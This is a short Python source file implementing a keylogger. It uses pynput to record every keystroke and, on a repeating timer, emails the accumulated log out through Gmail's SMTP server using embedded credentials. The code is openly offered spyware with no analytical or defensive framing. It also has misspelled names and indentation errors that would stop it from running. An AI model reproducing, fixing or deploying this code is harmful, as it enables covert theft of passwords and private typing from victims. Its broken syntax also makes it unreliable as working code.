import pynput.keyboard
import threading
import smtplib

class Keylogger:
    
    def __init__(self, timer, email, password):
        self.log = ""
        self.timer = timer
        self.email = email
        self.password = password
        print("Keylogger started")

    def process_keys(self, key):
        try:
            currnet_key = key.char
        except AttributeError:
            if key == key.space:
                currnet_key = " "
            else:
                currnet_key = " " + str(key) + " "

        self.add_to_log(currnet_key)
        
     
     def add_to_log(self, string):
         self.log = self.log + string
    
    def send_mail(self, email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    
        
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.timer, self.report)
        timer.start()
    
    def stert(self):    
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        

